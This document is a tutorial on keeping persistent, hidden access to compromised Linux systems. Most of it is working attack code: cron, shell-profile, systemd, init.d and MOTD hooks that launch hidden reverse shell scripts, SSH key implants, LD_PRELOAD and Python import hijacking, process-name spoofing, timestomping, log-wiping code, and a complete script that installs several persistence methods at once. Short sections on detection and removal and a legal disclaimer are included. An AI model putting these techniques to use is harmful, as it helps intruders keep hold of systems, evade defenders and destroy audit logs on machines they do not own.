# Linux Persistence Techniques

## Overview
This guide covers various methods to maintain persistent access on Linux systems after initial compromise. These techniques are for educational purposes and authorized testing only.

## Basic Persistence Methods

### 1. Crontab Persistence
```bash
# Add reverse shell to user crontab
echo "*/5 * * * * /usr/bin/python3 /tmp/.system_check.py > /dev/null 2>&1" | crontab -

# View current crontab
crontab -l

# Remove persistence
crontab -r
```

#### Advanced Crontab Hiding
```bash
# Use less obvious timing
echo "37 */2 * * * /usr/bin/python3 /home/user/.config/updater.py" | crontab -

# Hide in system crontab (requires root)
echo "15 3 * * * root /usr/bin/python3 /opt/.maintenance/checker.py" >> /etc/crontab
```

### 2. Bashrc/Profile Persistence
```bash
# Add to user's .bashrc
echo "python3 /home/user/.local/bin/update_checker.py &" >> ~/.bashrc

# Add to .profile
echo "nohup python3 ~/.config/system_monitor.py > /dev/null 2>&1 &" >> ~/.profile

# Add to .bash_profile
echo "/usr/bin/python3 /tmp/.sys_update >/dev/null 2>&1 &" >> ~/.bash_profile
```

### 3. Systemd Service Persistence
Create a systemd service for automatic startup:

```bash
# Create service file
sudo tee /etc/systemd/system/system-maintenance.service << 'EOF'
[Unit]
Description=System Maintenance Service
After=network.target
StartLimitBurst=0

[Service]
Type=simple
ExecStart=/usr/bin/python3 /opt/maintenance/system_check.py
Restart=always
RestartSec=30
User=nobody
Group=nogroup

[Install]
WantedBy=multi-user.target
EOF

# Enable and start service
sudo systemctl enable system-maintenance.service
sudo systemctl start system-maintenance.service

# Check status
sudo systemctl status system-maintenance.service
```

### 4. Init.d Script Persistence (Older Systems)
```bash
# Create init script
sudo tee /etc/init.d/system-monitor << 'EOF'
#!/bin/bash
### BEGIN INIT INFO
# Provides:          system-monitor
# Required-Start:    $network
# Required-Stop:     $network
# Default-Start:     2 3 4 5
# Default-Stop:      0 1 6
# Description:       System monitoring service
### END INIT INFO

case "$1" in
    start)
        echo "Starting system monitor..."
        nohup /usr/bin/python3 /opt/monitor/system_check.py > /dev/null 2>&1 &
        ;;
    stop)
        echo "Stopping system monitor..."
        pkill -f system_check.py
        ;;
    *)
        echo "Usage: $0 {start|stop}"
        exit 1
        ;;
esac
EOF

# Make executable and enable
sudo chmod +x /etc/init.d/system-monitor
sudo update-rc.d system-monitor defaults
```

### 5. SSH Key Persistence
```bash
# Add your public key to authorized_keys
mkdir -p ~/.ssh
echo "ssh-rsa AAAAB3NzaC1yc2E... your-public-key" >> ~/.ssh/authorized_keys
chmod 600 ~/.ssh/authorized_keys
chmod 700 ~/.ssh

# Hide the key in a different location
echo "ssh-rsa AAAAB3NzaC1yc2E... your-public-key" >> ~/.ssh/authorized_keys2
```

## Advanced Persistence Methods

### 1. Library Injection (LD_PRELOAD)
Create a malicious shared library:

```c
// malicious.c
#include <stdio.h>
#include <unistd.h>
#include <dlfcn.h>

void _init() {
    system("python3 /tmp/.reverse_shell.py &");
}
```

Compile and use:
```bash
# Compile
gcc -shared -fPIC malicious.c -o malicious.so

# Set LD_PRELOAD
echo "export LD_PRELOAD=/path/to/malicious.so" >> ~/.bashrc
```

### 2. Python Import Hijacking
```python
# Create malicious module in Python path
# /usr/lib/python3/dist-packages/requests.py (backup original first)

import subprocess
import threading

def start_reverse_shell():
    subprocess.Popen(['python3', '/tmp/.system_update.py'])

# Start in background thread
threading.Thread(target=start_reverse_shell, daemon=True).start()

# Import original requests module
import importlib.util
spec = importlib.util.spec_from_file_location("requests", "/usr/lib/python3/dist-packages/requests.py.bak")
requests = importlib.util.module_from_spec(spec)
spec.loader.exec_module(requests)
```

### 3. Kernel Module Persistence (Advanced)
```c
// Simple kernel module for persistence
#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>

static int __init persistence_init(void) {
    // Your persistence code here
    return 0;
}

static void __exit persistence_exit(void) {
    // Cleanup code
}

module_init(persistence_init);
module_exit(persistence_exit);
MODULE_LICENSE("GPL");
```

### 4. MOTD Persistence
```bash
# Add to message of the day
echo "python3 /opt/.system/monitor.py &" | sudo tee -a /etc/update-motd.d/00-header

# Or create new MOTD script
sudo tee /etc/update-motd.d/99-custom << 'EOF'
#!/bin/bash
nohup python3 /tmp/.maintenance.py > /dev/null 2>&1 &
EOF

sudo chmod +x /etc/update-motd.d/99-custom
```

## Stealth and Evasion

### 1. Process Name Spoofing
```python
#!/usr/bin/env python3
import os
import sys

# Change process name
def set_process_name(name):
    try:
        import ctypes
        libc = ctypes.CDLL("libc.so.6")
        libc.prctl(15, name.encode(), 0, 0, 0)  # PR_SET_NAME
    except:
        pass

# Use at start of script
set_process_name("systemd-resolve")
```

### 2. Hidden File Techniques
```bash
# Use dot files
mv reverse_shell.py ~/.system_check

# Hide in system directories
sudo mkdir -p /opt/.maintenance
sudo cp reverse_shell.py /opt/.maintenance/system_update

# Use space character trick
cp reverse_shell.py " system_update"  # Note the leading space

# Hide in /dev (temporary files)
cp reverse_shell.py /dev/shm/.system_check
```

### 3. Timestamp Manipulation
```bash
# Copy timestamps from legitimate file
touch -r /bin/ls /tmp/.reverse_shell.py

# Set specific timestamp
touch -t 202301010000 /tmp/.reverse_shell.py
```

### 4. Log Evasion
```python
# Add to your Python script
import os

def clear_logs():
    """Clear traces from common log files"""
    log_files = [
        '/var/log/auth.log',
        '/var/log/syslog',
        '/var/log/messages',
        '~/.bash_history'
    ]
    
    for log_file in log_files:
        try:
            if os.path.exists(log_file):
                # Don't delete, just truncate to avoid suspicion
                with open(log_file, 'w') as f:
                    pass
        except:
            pass

# Disable history
os.environ['HISTFILE'] = '/dev/null'
os.system('unset HISTFILE')
```

## Python-Specific Persistence

### 1. Site-packages Persistence
```python
# Add to site-packages startup
import site
import os

site_packages = site.getsitepackages()[0]
startup_file = os.path.join(site_packages, 'sitecustomize.py')

startup_code = '''
import threading
import subprocess

def background_task():
    subprocess.Popen(['python3', '/tmp/.system_monitor.py'])

threading.Thread(target=background_task, daemon=True).start()
'''

with open(startup_file, 'w') as f:
    f.write(startup_code)
```

### 2. PYTHONSTARTUP Persistence
```bash
# Set PYTHONSTARTUP environment variable
echo 'export PYTHONSTARTUP=/home/user/.python_startup.py' >> ~/.bashrc

# Create startup script
cat > ~/.python_startup.py << 'EOF'
import subprocess
import threading

def start_monitor():
    subprocess.Popen(['python3', '/tmp/.reverse_monitor.py'])

threading.Thread(target=start_monitor, daemon=True).start()
EOF
```

## Persistence Verification

### Check Running Persistence
```bash
# Check crontab
crontab -l
sudo cat /etc/crontab

# Check systemd services
systemctl list-units --state=running | grep -i maintenance

# Check startup files
cat ~/.bashrc | grep -v "^#"
cat ~/.profile | grep -v "^#"

# Check processes
ps aux | grep python
pstree

# Check network connections
netstat -tulpn | grep ESTABLISHED
ss -tulpn
```

### Persistence Removal
```bash
# Remove crontab entries
crontab -e

# Remove from startup files
sed -i '/system_check/d' ~/.bashrc

# Stop and disable systemd services
sudo systemctl stop system-maintenance.service
sudo systemctl disable system-maintenance.service
sudo rm /etc/systemd/system/system-maintenance.service

# Remove hidden files
find /tmp -name ".*" -type f -exec rm {} \;
```

## Detection Considerations

### What Blue Teams Look For:
1. **Unusual cron jobs**: Regular execution of unknown scripts
2. **Suspicious processes**: Processes with spoofed names or unusual locations
3. **Network connections**: Unexpected outbound connections
4. **File modifications**: Changes to startup files or system directories
5. **System behavior**: Unusual resource usage or network activity

### Staying Under the Radar:
1. **Use legitimate-looking names**: Mirror existing system processes
2. **Random timing**: Avoid predictable patterns in cron jobs
3. **Resource management**: Don't consume excessive CPU/memory
4. **Mimic normal traffic**: Use common ports and protocols
5. **Cleanup**: Remove artifacts when no longer needed

## Example Persistence Script

```python
#!/usr/bin/env python3
"""
Multi-method persistence implementation
Educational purposes only
"""

import os
import sys
import subprocess
import time
import random

class PersistenceManager:
    def __init__(self):
        self.payload_path = os.path.abspath(__file__)
        self.hidden_path = os.path.expanduser("~/.config/system_update.py")
    
    def install_persistence(self):
        """Install multiple persistence methods"""
        methods = [
            self.crontab_persistence,
            self.bashrc_persistence,
            self.systemd_persistence
        ]
        
        for method in methods:
            try:
                method()
                print(f"[+] {method.__name__} installed successfully")
            except Exception as e:
                print(f"[-] {method.__name__} failed: {e}")
    
    def crontab_persistence(self):
        """Install crontab persistence"""
        # Random minute to avoid detection
        minute = random.randint(0, 59)
        hour = random.randint(1, 23)
        
        cron_entry = f"{minute} {hour} * * * /usr/bin/python3 {self.hidden_path} > /dev/null 2>&1"
        
        # Get current crontab and add entry
        current_cron = subprocess.run(['crontab', '-l'], capture_output=True, text=True)
        if current_cron.returncode == 0:
            new_cron = current_cron.stdout + "\n" + cron_entry
        else:
            new_cron = cron_entry
        
        # Install new crontab
        proc = subprocess.Popen(['crontab', '-'], stdin=subprocess.PIPE, text=True)
        proc.communicate(input=new_cron)
    
    def bashrc_persistence(self):
        """Install bashrc persistence"""
        bashrc_path = os.path.expanduser("~/.bashrc")
        persistence_line = f"nohup python3 {self.hidden_path} > /dev/null 2>&1 &"
        
        with open(bashrc_path, 'a') as f:
            f.write(f"\n# System update checker\n{persistence_line}\n")
    
    def systemd_persistence(self):
        """Install systemd service persistence"""
        service_content = f"""[Unit]
Description=System Update Monitor
After=network.target

[Service]
Type=simple
ExecStart=/usr/bin/python3 {self.hidden_path}
Restart=always
RestartSec=300
User={os.getenv('USER')}

[Install]
WantedBy=multi-user.target
"""
        
        service_path = f"/home/{os.getenv('USER')}/.config/systemd/user/system-update.service"
        os.makedirs(os.path.dirname(service_path), exist_ok=True)
        
        with open(service_path, 'w') as f:
            f.write(service_content)
        
        # Enable user service
        subprocess.run(['systemctl', '--user', 'enable', 'system-update.service'])
        subprocess.run(['systemctl', '--user', 'start', 'system-update.service'])
    
    def hide_payload(self):
        """Copy payload to hidden location"""
        import shutil
        
        # Create directory if it doesn't exist
        os.makedirs(os.path.dirname(self.hidden_path), exist_ok=True)
        
        # Copy script to hidden location
        shutil.copy2(self.payload_path, self.hidden_path)
        
        # Make executable
        os.chmod(self.hidden_path, 0o755)

if __name__ == "__main__":
    manager = PersistenceManager()
    manager.hide_payload()
    manager.install_persistence()
    
    print("[+] Persistence installation completed")
    print(f"[+] Payload hidden at: {manager.hidden_path}")
```

## Important Notes

⚠️ **Legal and Ethical Considerations:**
- Only use on systems you own or have explicit permission to test
- These techniques can be detected by modern security tools
- Always document your activities for legitimate testing
- Remove all persistence mechanisms after testing
- This knowledge should only be used for defensive purposes and authorized testing

⚠️ **Technical Considerations:**
- Some methods require root privileges
- Modern systems have additional protections (SELinux, AppArmor)
- Antivirus software may detect these techniques
- Always test in isolated environments first